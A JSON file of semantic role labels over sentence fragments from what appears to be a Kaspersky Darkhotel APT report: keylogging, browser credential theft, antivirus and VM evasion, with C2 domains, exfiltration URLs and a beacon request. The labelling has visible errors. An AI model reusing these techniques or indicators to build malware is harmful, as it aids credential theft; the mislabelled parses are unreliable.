format:\n<list>\n<UserId>\u037e<UniqueMachineId>\u037e<EncryptionKey>\u037e<GeneralSysInfo>\n</list>\nwhere <UserId> is hardcoded identifier (i.e": {"is": {"V": {"text": "is", "index": 0}, "ARG2": {"text": "hardcoded"}, "ARG1": {"text": "identifier ( i.e"}}, "hardcoded": {"V": {"text": "hardcoded", "index": 1}, "ARG1": {"text": "identifier ( i.e"}}}, " Right after\nthat keystroke generation thread is terminated and the module continues normal\nexecution as if \u00abbdagent.exe\u00bb was not running": {"keystroke": {"V": {"text": "keystroke", "index": 3}, "ARG1": {"text": "generation thread"}}, "is": {"V": {"text": "is", "index": 6}}, "terminated": {"ARGM-TMP": {"text": "Right after that"}, "ARG1": {"text": "keystroke generation thread"}, "V": {"text": "terminated", "index": 7}}, "continues": {"ARG0": {"text": "the module"}, "V": {"text": "continues", "index": 11}, "ARG1": {"text": "normal execution"}, "ARGM-ADV": {"text": "as if \u00ab bdagent.exe \u00bb was not running"}}, "was": {"V": {"text": "was", "index": 19}}, "running": {"ARG1": {"text": "\u00ab bdagent.exe \u00bb"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "running", "index": 21}}}, " It gets\nCPU name and identifier from the registry at HKLM\\HARDWARE\\DESCRIPTION\\\nSystem\\CentralProcessor\\0\nand collects IP and MAC addresses of local network adapters": {"gets": {"ARG1": {"text": "It"}, "V": {"text": "gets", "index": 1}, "ARG2": {"text": "CPU name and identifier from the registry at HKLM\\HARDWARE\\DESCRIPTION\\ System\\CentralProcessor\\0 and collects IP and MAC addresses of local network adapters"}}, "collects": {"V": {"text": "collects", "index": 13}, "ARG1": {"text": "IP"}}}, "\nAfter stealing secrets from local system the malware executes some kind of\nembedded script": {"stealing": {"V": {"text": "stealing", "index": 1}, "ARG1": {"text": "secrets"}, "ARG2": {"text": "from local system"}}, "executes": {"ARGM-TMP": {"text": "After stealing secrets from local system"}, "ARG0": {"text": "the malware"}, "V": {"text": "executes", "index": 8}, "ARG1": {"text": "some kind of embedded script"}}}, "\nThe module uploads all collected information to one of the following URLs via\nPOST request:\n<list>\n\u2022\t hxxp://fenraw.northgeremy.info/html/docu.php\n\u2022\t hxxp://fenrmi.eu.pn/html/docu.php\t\n\u2022\t hxxp://fenrix.yaahosting.info/html/docu.php\t\n\u2022\t hxxp://fenry.zoka.cc/html/docu.php\t\n</list>\nIt\u2019s the first time we see .pn domain used in malware": {"uploads": {"ARG0": {"text": "The module"}, "V": {"text": "uploads", "index": 2}, "ARG1": {"text": "all"}}, "collected": {"ARG0": {"text": "The module uploads all"}, "V": {"text": "collected", "index": 4}, "ARG1": {"text": "information"}, "ARG2": {"text": "to one of the"}, "ARGM-TMP": {"text": "following URLs via POST request"}}, "following": {"V": {"text": "following", "index": 10}}, "see": {"ARG0": {"text": "we"}, "V": {"text": "see", "index": 22}}, "used": {"V": {"text": "used", "index": 25}, "ARG2": {"text": "in malware"}}}, "\nThis keylogger module encrypts and stores gathered data in a log file, as men-\ntioned previously": {"gathered": {"ARG0": {"text": "This keylogger module encrypts and stores"}, "V": {"text": "gathered", "index": 6}, "ARG1": {"text": "data"}, "ARGM-LOC": {"text": "in a log file"}, "ARGM-ADV": {"text": "as men- tioned previously"}}, "tioned": {"ARG0": {"text": "men-"}, "V": {"text": "tioned", "index": 15}, "ARGM-TMP": {"text": "previously"}}}, "\n    servequake.com) and issues a HTTP GET request with hardcoded User\u00adAgent\n    string:\n<list>\n    GET /major/images/view.php HTTP/1.1\n    User\u00adAgent: Mozilla/4.0 (compatible\u037e MSIE 8.0\u037e Windows NT 6.1\u037e Trident/4.0\u037e\n    SLCC2\u037e .NET CLR 2.0.50727\u037e .NET CLR 3.5.30729\u037e .NET CLR 3.0.30729\u037e\n    Media Center PC 6.0)\n    Host: autolace.twilightparadox.com\n    Connection: Keep\u00adAlive\n    Cache\u00adControl: no\u00adcache\n</list>\n    The server response should contain \u00abDEXT87\u00bb string which is used to rec-\n    ognize valid response": {"issues": {"V": {"text": "issues", "index": 3}, "ARG1": {"text": "a HTTP GET request with hardcoded User\u00adAgent string"}}, "GET": {"V": {"text": "GET", "index": 6}, "ARG1": {"text": "request"}}, "hardcoded": {"V": {"text": "hardcoded", "index": 9}, "ARG1": {"text": "User\u00adAgent string"}}, "should": {"ARG0": {"text": "The server response"}, "V": {"text": "should", "index": 16}, "ARG1": {"text": "\u00ab DEXT87 \u00bb string which is used to rec- ognize valid response"}}, "contain": {"ARG0": {"text": "The server response"}, "ARGM-MOD": {"text": "should"}, "V": {"text": "contain", "index": 17}, "ARG1": {"text": "\u00ab DEXT87 \u00bb string which is used to rec- ognize valid response"}}, "is": {"V": {"text": "is", "index": 23}}, "used": {"ARG1": {"text": "\u00ab DEXT87 \u00bb string"}, "R-ARG1": {"text": "which"}, "V": {"text": "used", "index": 24}, "ARG2": {"text": "to rec- ognize valid response"}}, "rec-": {"V": {"text": "rec-", "index": 26}, "ARG1": {"text": "ognize valid response"}}, "ognize": {"V": {"text": "ognize", "index": 27}, "ARG1": {"text": "valid response"}}}, "\n</list>\nThis sample is started by code running within svchost.exe on WinXP SP3": {"is": {"V": {"text": "is", "index": 2}}, "started": {"ARG1": {"text": "This sample"}, "V": {"text": "started", "index": 3}, "ARG0": {"text": "by code"}, "ARG2": {"text": "running within svchost.exe on WinXP SP3"}}, "running": {"ARG1": {"text": "This sample"}, "V": {"text": "running", "index": 6}, "ARGM-LOC": {"text": "within svchost.exe"}, "ARGM-ADV": {"text": "on WinXP SP3"}}}, " If the process is found it\nkeeps a record of the software name using short AV Identifier string from the fol-\nlowing table of rules\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                 \n<header>65</header>\n\n<table>\nProcess Name               AV Identifier                Company Name, Country\n\nekrn.exe                   NOD                          ESET, Czech Republic\n\nNVCAgent.npc               NV                           Naver NHN, Vietnam\n\n360tray.exe                36                           Qihoo 360, China\n\nmsseces.exe                MS                           Microsoft, USA\n\nuiWinMgr.exe               TR                           TrendMicro, Japan\n\nAvastSvc.exe               AST                          Avast, Czech Republic\n\nRsMgrSvr.exe               RS                           Rising, China\n\nmcagent.exe                MC                           McAfee, USA\n\navgidsagent.exe            AV                           AVG, Czech Republic\n\nccsvchst.exe               NT                           Symantec, USA\n\nbdagent.exe                BD                           BitDefender, Romania\n\navp.exe                    KS                           Kaspersky, Russia\n\nV3LTray.exe                V                            AhnLab, South Korea\n\nAYAgent.aye                AY                           ESTSoft, South Korea\n</table>\nThe malware uses a trick to evade running on a VMware": {"is": {"V": {"text": "is", "index": 3}}, "found": {"ARG1": {"text": "the process"}, "V": {"text": "found", "index": 4}}, "keeps": {"ARG0": {"text": "it"}, "V": {"text": "keeps", "index": 6}, "ARG1": {"text": "a record of the software name"}, "ARG2": {"text": "using short AV Identifier string from the fol- lowing table of rules"}}, "using": {"V": {"text": "using", "index": 13}, "ARG1": {"text": "short AV Identifier string from the fol- lowing table of rules"}}, "lowing": {"V": {"text": "lowing", "index": 21}, "ARG2": {"text": "table"}}, "uses": {"ARGM-ADV": {"text": "If the process is found it keeps a record of the software name using short AV Identifier string from the fol- lowing table of rules"}, "ARG0": {"text": "The malware"}, "V": {"text": "uses", "index": 27}, "ARG1": {"text": "a trick"}, "ARG2": {"text": "to evade running on a VMware"}}, "evade": {"V": {"text": "evade", "index": 31}, "ARG1": {"text": "running on a VMware"}}, "running": {"V": {"text": "running", "index": 32}, "ARG1": {"text": "on a VMware"}}}, " Here is the list of\nURLs that are checked by the malware:\n<list>\n\u2022\thttp://twitter.com\n\u2022\thttp://facebook.coom\n\u2022\thttp://passport.yandex.ru/passport\n\u2022\thttp://yandex.ru\n\u2022\thttp://qip.ru\n\u2022\thttp://mail.qip.ru\n\u2022\thttps://login.nifty.com/service/login\n\u2022\thttp://e.mail.ru/cgibin/login\n\u2022\thttp://mail.ru\n\u2022\thttp://mail.126.com\n\u2022\thttp://secure.zapak.com/mail/zapakmail.php\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>62</header>\n\n\n\u2022\thttps://lavabit.com/apps/webmail/src/login.php\n\u2022\thttp://www.bigstring.com\n\u2022\thttp://www.gmx.com\n\u2022\thttp://passport.sohu.com/indexaction.action\n\u2022\thttp://www.sohu.com\n\u2022\thttps://www.zoho.com/login.html\n\u2022\thttp://mail.sina.com.cn\n\u2022\thttp://members.sina.com/index.php\n\u2022\thttp://www.care2.com/passport/login.html\n\u2022\thttp://www.mail.com/int\n\u2022\thttps://fastmail.fm/mail\n\u2022\thttps://www.inbox.com/login.aspx\n\u2022\thttp://www.gawab.com\n\u2022\thttp://mail.163.com\n\u2022\thttp://registration.lycos.com/login.php\n\u2022\thttp://mail.lycos.com\n\u2022\thttps://my.screenname.aol.com/_cqr/login/login.psp\n\u2022\thttps://edit.bjs.yahoo.com/config/login\n\u2022\thttps://login.yahoo.co.jp/config/login\n\u2022\thttps://login.yahoo.com/config/login_verify2\n\u2022\thttps://login.live.com/login.srf\n\u2022\thttps://www.google.com/accounts/servicelogin\n</list>\nThe list of targeted services includes some local services specifically popular in:\n<list>\n\u2022\t \tUnited States\n\u2022\t \tRussia\n\u2022\t \tChina\n\u2022\t \tJapan\n\u2022\t \tMiddle Eastern countries\n\u2022\t \tIndia\n</list>\nThe module uses several simple XOR\u00adbased algorithms to encrypt embedded\nstring data": {"is": {"ARG2": {"text": "Here"}, "V": {"text": "is", "index": 1}, "ARG1": {"text": "the list of URLs that are checked by the malware"}}, "are": {"V": {"text": "are", "index": 7}}, "checked": {"ARG1": {"text": "the list of URLs"}, "R-ARG1": {"text": "that"}, "V": {"text": "checked", "index": 8}, "ARG0": {"text": "by the malware"}}, "uses": {"ARG0": {"text": "The module"}, "V": {"text": "uses", "index": 15}, "ARG1": {"text": "several simple"}, "ARG2": {"text": "to encrypt embedded string data"}}, "encrypt": {"V": {"text": "encrypt", "index": 21}, "ARG1": {"text": "embedded"}}, "embedded": {"V": {"text": "embedded", "index": 22}, "ARG1": {"text": "string data"}}}, " In addition it\nmakes use of the following Mozilla Firefox libraries depending on Firefox version:\n<list>\n\u2022\t \tnss3.dll\n\u2022\t \tplc4.dll\n\u2022\t \tmozcrt19.dll\n\u2022\t \tmozutils.dll\n\u2022\t \tmozglue.dll\n\u2022\t \tmozsqlite3.dll\n\u2022\t \tsqlite3.dll\n\u2022\t \tnspr4.dll\n\u2022\t \tplds4.dll\n\u2022\t \tnssutil3.dll\n\u2022\t \tsoftokn3.dll\n</list>\nWhen stealing secrets from Firefox and Chrome it uses built\u00adin SQLite library code": {"makes": {"ARGM-DIS": {"text": "In addition"}, "ARG0": {"text": "it"}, "V": {"text": "makes", "index": 3}, "ARG1": {"text": "use of the following Mozilla Firefox libraries depending on Firefox version : When stealing secrets from Firefox and Chrome it uses built\u00adin SQLite library code"}}, "following": {"V": {"text": "following", "index": 7}, "ARG1": {"text": "Mozilla Firefox"}}, "depending": {"ARG0": {"text": "the following Mozilla Firefox libraries"}, "V": {"text": "depending", "index": 11}, "ARG1": {"text": "on Firefox version"}}, "stealing": {"ARGM-TMP": {"text": "When"}, "V": {"text": "stealing", "index": 17}, "ARG1": {"text": "secrets"}, "ARG2": {"text": "from Firefox"}}, "uses": {"ARG1": {"text": "Chrome"}, "ARG0": {"text": "it"}, "V": {"text": "uses", "index": 24}}}, " It is installed as a system kernel driver \u201cNdiskpro\u201d service, described as\na \u201cMicrocode Update Device\u201d": {"is": {"V": {"text": "is", "index": 1}}, "installed": {"ARG1": {"text": "It"}, "V": {"text": "installed", "index": 2}, "ARG2": {"text": "as a system kernel driver \u201c Ndiskpro \u201d service , described as a \u201c Microcode Update Device \u201d"}}, "described": {"ARG1": {"text": "a system kernel driver \u201c Ndiskpro \u201d service"}, "V": {"text": "described", "index": 13}, "ARG2": {"text": "as a \u201c Microcode Update Device \u201d"}}}, "\nIf it is running, it uses simple AV heuristics evasion technique": {"is": {"V": {"text": "is", "index": 2}}, "running": {"ARG1": {"text": "it"}, "V": {"text": "running", "index": 3}}, "uses": {"ARGM-ADV": {"text": "If it is running"}, "ARG0": {"text": "it"}, "V": {"text": "uses", "index": 6}, "ARG1": {"text": "simple AV heuristics evasion technique"}}}, " The result of this execution is appended\nto the stolen data and uploaded to the C&C server": {"is": {"ARG1": {"text": "The result of this execution"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "appended to the stolen data and uploaded to the C&C server"}}, "appended": {"ARG1": {"text": "The result of this execution"}, "V": {"text": "appended", "index": 6}, "ARG2": {"text": "to the stolen data"}}, "stolen": {"V": {"text": "stolen", "index": 9}, "ARG1": {"text": "data"}}, "uploaded": {"ARG1": {"text": "The result of this execution"}, "V": {"text": "uploaded", "index": 12}, "ARG2": {"text": "to the C&C server"}}}, "\n<GeneralSysInfo> field contains only basic information about the system, i.e.:\n<list>\nInfo\u037e\nSys@User : MYCOMPUTER@MyUser (0850)\nC P U : Intel(R) Core(TM) i3\u00ad1667U CPU @ 1600GHz\nSystem OS: Microsoft Windows XP (Service Pack 3)\nNet card : 192.168.0.2 (133773311337)\n</list>\nIf the server reply contains a keyword \u00abminmei\u00bb it continues sending additional in-\nformation": {"contains": {"ARG0": {"text": "the server reply"}, "V": {"text": "contains", "index": 4}, "ARG1": {"text": "a keyword \u00ab minmei"}}, "continues": {"ARGM-ADV": {"text": "If the server reply contains a keyword \u00ab minmei \u00bb"}, "V": {"text": "continues", "index": 11}, "ARG1": {"text": "sending additional in- formation"}}, "sending": {"ARG0": {"text": "it"}, "V": {"text": "sending", "index": 12}, "ARG1": {"text": "additional"}}}, "\nThis component then encrypts and writes the retrieved values ondisk to a ran-\n\n\n<footer>\nTLP: Green\t              For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f\n<header>70</header>\n\n\ndomly named .tmp, file like ffffz07131101.tmp": {"encrypts": {"ARG1": {"text": "This component"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "encrypts", "index": 3}}, "writes": {"ARG0": {"text": "This component"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "writes", "index": 5}, "ARG1": {"text": "the retrieved values ondisk"}, "ARG2": {"text": "to a ran- domly named .tmp , file like ffffz07131101.tmp"}}, "retrieved": {"V": {"text": "retrieved", "index": 7}, "ARG1": {"text": "values"}}, "ondisk": {"ARG1": {"text": "the retrieved values"}, "V": {"text": "ondisk", "index": 9}}, "named": {"ARG1": {"text": "a"}, "ARGM-MNR": {"text": "ran-/ domly"}, "V": {"text": "named", "index": 14}}}, " It spawns an-\nother suspended process with its own igfxext.exe image, but decrypts a smaller\n32kb executable (cf1319d94f33380622ba000b7d8ad6e9,Trojan\u00adDownloader": {"spawns": {"ARG0": {"text": "It"}, "V": {"text": "spawns", "index": 1}, "ARG1": {"text": "an- other suspended process with its own igfxext.exe image"}}, "suspended": {"V": {"text": "suspended", "index": 4}, "ARG1": {"text": "process"}}, "decrypts": {"V": {"text": "decrypts", "index": 13}, "ARG1": {"text": "a smaller 32 kb executable ( cf1319d94f33380622ba000b7d8ad6e9,Trojan\u00adDownloader"}}, "cf1319d94f33380622ba000b7d8ad6e9,Trojan\u00adDownloader": {"ARGM-TMP": {"text": "decrypts"}, "ARG1": {"text": "a smaller"}, "ARG2": {"text": "32 kb executable ("}, "V": {"text": "cf1319d94f33380622ba000b7d8ad6e9,Trojan\u00adDownloader", "index": 20}}}, " If VM is detected\nthe process instantly terminates": {"is": {"V": {"text": "is", "index": 2}}, "detected": {"ARG1": {"text": "VM"}, "V": {"text": "detected", "index": 3}}, "terminates": {"ARGM-ADV": {"text": "If VM is detected"}, "ARG1": {"text": "the process"}, "ARGM-TMP": {"text": "instantly"}, "V": {"text": "terminates", "index": 7}}}, " The list of deleted\nfiles includes the following:\n<list>\n\u2022\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\dtlcntr.exe\n\u2022\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\googletoolbar.exe\n\u2022\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\active.dll\n\u2022\t \t%APPDATA%\\Microsoft\\Crypto\\DES64v7\\detect.dll\n</list>\nThe next is step is to check if current directory has a file named \u00abU\u00bb": {"deleted": {"V": {"text": "deleted", "index": 3}, "ARG1": {"text": "files"}}, "includes": {"ARG2": {"text": "The list of deleted files"}, "V": {"text": "includes", "index": 5}, "ARG1": {"text": "the following"}}, "following": {"V": {"text": "following", "index": 7}}, "is": {"ARG1": {"text": "The next"}, "V": {"text": "is", "index": 11}, "ARG2": {"text": "step"}}, "is_2": {"ARG1": {"text": "The next is step"}, "V": {"text": "is", "index": 13}, "ARG2": {"text": "to check if current directory has a file named \u00ab U \u00bb"}}, "check": {"V": {"text": "check", "index": 15}, "ARGM-ADV": {"text": "if current directory has a file named \u00ab U \u00bb"}}, "has": {"ARG0": {"text": "current directory"}, "V": {"text": "has", "index": 19}, "ARG1": {"text": "a file named \u00ab U \u00bb"}}, "named": {"ARG1": {"text": "a file"}, "V": {"text": "named", "index": 22}, "ARG2": {"text": "\u00ab U \u00bb"}}}, " When\nIntelliForms information is stolen the malware tries to check the list of known\nlogin page URLs to recover the originating webpage address": {"is": {"V": {"text": "is", "index": 3}}, "stolen": {"ARGM-TMP": {"text": "When"}, "ARG1": {"text": "IntelliForms information"}, "V": {"text": "stolen", "index": 4}}, "tries": {"ARGM-TMP": {"text": "When IntelliForms information is stolen"}, "ARG0": {"text": "the malware"}, "V": {"text": "tries", "index": 7}, "ARG1": {"text": "to check the list of known login page URLs to recover the originating webpage address"}}, "check": {"ARG0": {"text": "the malware"}, "V": {"text": "check", "index": 9}, "ARG1": {"text": "the list of known login page URLs"}, "ARGM-PRP": {"text": "to recover the originating webpage address"}}, "known": {"V": {"text": "known", "index": 13}, "ARG1": {"text": "login page URLs"}}, "recover": {"V": {"text": "recover", "index": 18}, "ARG1": {"text": "the originating webpage address"}}, "originating": {"V": {"text": "originating", "index": 20}, "ARG1": {"text": "webpage address"}}}, " All of these infected files drop a 63kb self injecting compo-\nnent": {"infected": {"V": {"text": "infected", "index": 3}, "ARG1": {"text": "files"}}, "drop": {"ARG0": {"text": "All of these infected files"}, "V": {"text": "drop", "index": 5}, "ARG1": {"text": "a 63 kb self"}, "ARG4": {"text": "injecting compo-"}, "ARG2": {"text": "nent"}}, "injecting": {"ARG0": {"text": "a 63 kb self"}, "V": {"text": "injecting", "index": 10}, "ARG1": {"text": "compo- nent"}}}, " The main purpose of the module is to collect various secrets stored on a\nlocal system": {"is": {"ARG1": {"text": "The main purpose of the module"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "to collect various secrets stored on a local system"}}, "collect": {"V": {"text": "collect", "index": 8}, "ARG1": {"text": "various secrets stored on a local system"}}, "stored": {"ARG1": {"text": "various secrets"}, "V": {"text": "stored", "index": 11}, "ARGM-LOC": {"text": "on a local system"}}}, " If not, it triggers a special variable that makes module dormant and dis-\nables further communication with C&C server": {"triggers": {"ARGM-ADV": {"text": "If not"}, "ARG0": {"text": "it"}, "V": {"text": "triggers", "index": 4}, "ARG1": {"text": "a special variable that makes module dormant and dis- ables further communication with C&C server"}}, "makes": {"ARG0": {"text": "a special variable"}, "R-ARG0": {"text": "that"}, "V": {"text": "makes", "index": 9}, "ARG1": {"text": "module dormant"}}}, "\nThe module implements a method to resist running in virtual environment": {"implements": {"ARG0": {"text": "The module"}, "V": {"text": "implements", "index": 2}, "ARG1": {"text": "a method to resist running in virtual environment"}}, "resist": {"V": {"text": "resist", "index": 6}, "ARG1": {"text": "running in virtual environment"}}, "running": {"V": {"text": "running", "index": 7}, "ARG1": {"text": "in virtual environment"}}}, " The code starts a\nthread that simulates keystrokes of ESC keyboard key and then shows a system\nmodal message box": {"starts": {"ARG2": {"text": "The code"}, "V": {"text": "starts", "index": 2}, "ARG1": {"text": "a thread that simulates keystrokes of ESC keyboard key and then shows a system modal message box"}}, "simulates": {"ARG0": {"text": "a thread"}, "R-ARG0": {"text": "that"}, "V": {"text": "simulates", "index": 6}, "ARG1": {"text": "keystrokes of ESC keyboard key"}}, "shows": {"ARG0": {"text": "a thread"}, "R-ARG0": {"text": "that"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "shows", "index": 14}, "ARG1": {"text": "a system modal message box"}}}, " If \u00abU\u00bb file is older than 180 days, the module wipes\n\n<footer>\nTLP: Green\t               For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                  \n<header>59</header>\n\n\nthe file": {"is": {"ARG1": {"text": "\u00ab U \u00bb file"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "older than 180 days"}}, "wipes": {"ARGM-ADV": {"text": "If \u00ab U \u00bb file is older than 180 days"}, "ARG0": {"text": "the module"}, "V": {"text": "wipes", "index": 13}, "ARG1": {"text": "the file"}}}, " Every infected file has functionality described in\nTrojan\u00adDropper & Injector section, so it can collect information about the comput-\ner, send it to the C2 and download other Darkhotel components as commanded": {"has": {"V": {"text": "has", "index": 3}}, "described": {"V": {"text": "described", "index": 5}, "ARGM-LOC": {"text": "in Trojan\u00adDropper & Injector section"}}, "can": {"V": {"text": "can", "index": 14}}, "collect": {"ARG0": {"text": "it"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "collect", "index": 15}, "ARG1": {"text": "information about the comput- er , send it to the C2 and download other Darkhotel components as commanded"}}, "send": {"ARG0": {"text": "the comput-"}, "ARGM-DIS": {"text": "er"}, "V": {"text": "send", "index": 22}, "ARG1": {"text": "it"}, "ARG2": {"text": "to the C2"}}, "download": {"ARGM-MOD": {"text": "can"}, "ARG0": {"text": "the comput-"}, "ARGM-DIS": {"text": "er"}, "V": {"text": "download", "index": 28}, "ARG1": {"text": "other Darkhotel components"}, "ARGM-PRD": {"text": "as commanded"}}, "commanded": {"V": {"text": "commanded", "index": 33}}}, " The module adds autorun registry\nsettings to enable an automatic start during system boot": {"adds": {"ARG0": {"text": "The module"}, "V": {"text": "adds", "index": 2}, "ARG1": {"text": "autorun registry settings to enable an automatic start during system boot"}}, "enable": {"ARG0": {"text": "autorun"}, "V": {"text": "enable", "index": 7}, "ARG1": {"text": "an automatic start during system boot"}}}, " These weak encryption keys, when broken, could\nallow an attacker to use the certificates fraudulently to spoof content, perform\nphishing attacks, or perform man\u00adin\u00adthe\u00admiddle attacks against all Web browser\nusers including users of Internet Explorer": {"broken": {"ARGM-TMP": {"text": "when"}, "V": {"text": "broken", "index": 6}}, "could": {"ARGM-TMP": {"text": "when"}, "V": {"text": "could", "index": 8}}, "allow": {"ARG0": {"text": "These weak encryption keys"}, "ARGM-TMP": {"text": "when broken"}, "ARGM-MOD": {"text": "could"}, "V": {"text": "allow", "index": 9}, "ARG1": {"text": "an attacker to use the certificates fraudulently to spoof content , perform phishing attacks , or perform man\u00adin\u00adthe\u00admiddle attacks against all Web browser users including users of Internet Explorer"}}, "use": {"ARG0": {"text": "an attacker"}, "V": {"text": "use", "index": 13}, "ARG1": {"text": "the certificates fraudulently"}, "ARG2": {"text": "to spoof content , perform phishing"}}, "spoof": {"V": {"text": "spoof", "index": 18}, "ARG1": {"text": "content"}}, "perform": {"ARG0": {"text": "an attacker"}, "V": {"text": "perform", "index": 21}, "ARG1": {"text": "phishing attacks"}}, "phishing": {"V": {"text": "phishing", "index": 22}, "ARG1": {"text": "attacks"}}, "perform_2": {"ARG0": {"text": "an attacker"}, "V": {"text": "perform", "index": 26}, "ARG1": {"text": "man\u00adin\u00adthe\u00admiddle attacks"}, "ARGM-GOL": {"text": "against all Web browser users"}, "ARGM-ADV": {"text": "including users of Internet Explorer"}}, "including": {"ARG2": {"text": "all Web browser users"}, "V": {"text": "including", "index": 34}, "ARG1": {"text": "users of Internet Explorer"}}}, " The\nactor\u2019s offensive activity can be tied to specific hotel and business center Wi\u2011Fi\nand physical connections, some of it is also tied to p2p/file sharing networks,\nand they have been known to spear-phish targets as well": {"can": {"V": {"text": "can", "index": 5}}, "be": {"V": {"text": "be", "index": 6}}, "tied": {"ARG1": {"text": "The actor \u2019s offensive activity"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "tied", "index": 7}, "ARG2": {"text": "to specific hotel and business center Wi\u2011Fi and physical connections"}}, "is": {"V": {"text": "is", "index": 22}}, "tied_2": {"ARG1": {"text": "some of it"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "tied", "index": 24}, "ARG3": {"text": "to p2p / file sharing networks"}}, "have": {"V": {"text": "have", "index": 34}}, "been": {"V": {"text": "been", "index": 35}}, "known": {"ARG1": {"text": "they"}, "V": {"text": "known", "index": 36}, "ARG0": {"text": "to spear - phish targets"}, "ARGM-ADV": {"text": "as well"}}}, "\nThis keylogger is dropped by code running within svchost.exe on WinXP SP3,\nwhich maintains an interesting debug string:\n<list>\nd:\\KerKey\\KerKey(\uc77c\ubc18)\\KerKey\\release\\KerKey.pdb\nNote \uc77c\ubc18 means \u201cGeneral\u201d in Korean\n</list>\nIt probably was developed as a part of a mid-to-late 2009 project:\ne:\\project\\2009\\x\\total_source\\32bit\\ndiskpro\\src\\ioman.c\n</section>\n\n<section>\n<heading>Keylogger Code</heading>\nThis driver package is built to resemble a legitimate low-level Microsoft system\ndevice": {"is": {"V": {"text": "is", "index": 2}}, "dropped": {"ARG1": {"text": "This keylogger"}, "V": {"text": "dropped", "index": 3}, "ARG0": {"text": "by code running within svchost.exe"}, "ARGM-ADV": {"text": "on WinXP SP3 , which maintains an interesting debug string"}}, "running": {"V": {"text": "running", "index": 6}, "ARGM-LOC": {"text": "within svchost.exe"}, "ARG1": {"text": "on WinXP SP3 , which maintains an interesting debug string"}}, "maintains": {"ARG0": {"text": "WinXP SP3"}, "R-ARG0": {"text": "which"}, "V": {"text": "maintains", "index": 14}, "ARG1": {"text": "an interesting debug string"}}, "is_2": {"V": {"text": "is", "index": 23}}, "built": {"ARG1": {"text": "This driver package"}, "V": {"text": "built", "index": 24}, "ARG2": {"text": "to resemble a legitimate low - level Microsoft system device"}}, "resemble": {"ARG1": {"text": "This driver package"}, "V": {"text": "resemble", "index": 26}, "ARG2": {"text": "a legitimate low - level Microsoft system device"}}}, " The attackers maintain\na\u00a0web interface to vet these new victim systems": {"maintain": {"ARG0": {"text": "The attackers"}, "V": {"text": "maintain", "index": 2}, "ARG1": {"text": "a web interface to vet these new victim systems"}}, "vet": {"ARG0": {"text": "a web interface"}, "V": {"text": "vet", "index": 7}, "ARG1": {"text": "these new victim systems"}}}, " It drops the igfxext.exe \u201cselective infector\u201d component to disk and\nruns it": {"drops": {"ARG0": {"text": "It"}, "V": {"text": "drops", "index": 1}, "ARG1": {"text": "the igfxext.exe \u201c selective infector \u201d component to disk and runs it"}}, "disk": {"ARG0": {"text": "the igfxext.exe"}, "V": {"text": "disk", "index": 10}, "ARG1": {"text": "it"}}, "runs": {"V": {"text": "runs", "index": 12}, "ARG1": {"text": "it"}}}, "\nThe attackers were also very careful to immediately delete all traces of their\ntools as soon as an attack was carried out successfully": {"were": {"ARG1": {"text": "The attackers"}, "V": {"text": "were", "index": 2}, "ARGM-ADV": {"text": "also"}, "ARG2": {"text": "very careful to immediately delete all traces of their tools"}, "ARGM-TMP": {"text": "as soon as an attack was carried out successfully"}}, "delete": {"ARGM-TMP": {"text": "immediately/ as soon as an attack was carried out"}, "V": {"text": "delete", "index": 8}, "ARG1": {"text": "all traces of their tools"}}, "was": {"V": {"text": "was", "index": 19}}, "carried": {"ARG1": {"text": "an attack"}, "V": {"text": "carried", "index": 20}, "ARGM-MNR": {"text": "successfully"}}}, "\n</section>\n\n\n<footer>\nTLP: Green\t                For any inquiries, please contact intelreports@kaspersky.com\n</footer>\n\f                                                                                       \n<header>7</header>\n\n<section>\n<heading>Indiscriminate Spread</heading>\nAn example of the Darkhotel APT\u2019s indiscriminate malware spreading is dem-\nonstrated by the way it seeds Japanese p2p sharing sites, where the malware\nis delivered as a part of a large (approximately 900mb) rar archive": {"spreading": {"ARG1": {"text": "the Darkhotel APT \u2019s indiscriminate malware"}, "V": {"text": "spreading", "index": 9}}, "is": {"ARG1": {"text": "An example of the Darkhotel APT \u2019s indiscriminate malware spreading"}, "V": {"text": "is", "index": 10}, "ARG2": {"text": "dem- onstrated by the way it seeds Japanese p2p sharing sites , where the malware is delivered as a part of a large ( approximately 900 mb ) rar archive"}}, "onstrated": {"ARG1": {"text": "An example of the Darkhotel APT \u2019s indiscriminate malware spreading"}, "V": {"text": "onstrated", "index": 12}, "ARGM-MNR": {"text": "by the way it seeds Japanese p2p sharing sites , where the malware is delivered as a part of a large ( approximately 900 mb ) rar archive"}}, "seeds": {"ARGM-MNR": {"text": "the way"}, "ARG0": {"text": "it"}, "V": {"text": "seeds", "index": 17}, "ARG1": {"text": "Japanese p2p sharing sites , where the malware is delivered as a part of a large ( approximately 900 mb ) rar archive"}}, "is_2": {"V": {"text": "is", "index": 26}}, "delivered": {"ARGM-LOC": {"text": "Japanese p2p sharing sites"}, "R-ARGM-LOC": {"text": "where"}, "ARG1": {"text": "the malware"}, "V": {"text": "delivered", "index": 27}, "ARG2": {"text": "as a part of a large ( approximately 900 mb ) rar archive"}}, "rar": {"ARG1": {"text": "a large ( approximately 900 mb )"}, "V": {"text": "rar", "index": 39}, "ARGM-EXT": {"text": "archive"}}}, " Related\nDarkhotel command and control server domains include:\n<list>\n microblo5.mooo.com\n microyours.ignorelist.com\n micronames.jumpingcrab.com\n microchisk.mooo.com\n microalba.serveftp.com\n</list>\n</section>\n\n<section>\n<heading>Darkhotel Spear-phishing Campaigns</heading>\nDarkhotel campaigns involving typical spear-phished Tapaoux implants publicly\nappeared in bits and pieces several times over the past five years": {"include": {"ARG2": {"text": "Related Darkhotel command and control server domains"}, "V": {"text": "include", "index": 7}, 